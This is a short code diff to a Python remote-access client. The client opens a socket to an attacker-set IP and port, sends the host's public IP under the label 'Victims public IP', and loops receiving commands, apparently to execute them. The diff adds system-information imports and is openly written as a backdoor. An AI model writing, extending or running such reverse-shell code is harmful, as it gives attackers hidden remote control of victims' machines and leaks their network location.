@@ -2,6 +2,9 @@ import os
 import socket
 import subprocess
 from requests import get
+import psutil
+import platform
+from datetime import datetime
 
 
 IP = ""
@@ -12,8 +15,7 @@ try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((IP, PORT))
     ip = get('https://api.ipify.org').text
-    s.send('[+] Public IP: {}'.format(ip).encode())
-
+    s.send('[+] Victims public IP: {}'.format(ip).encode())
     while True:
         command = s.recv(1024).decode()
         if command != "":
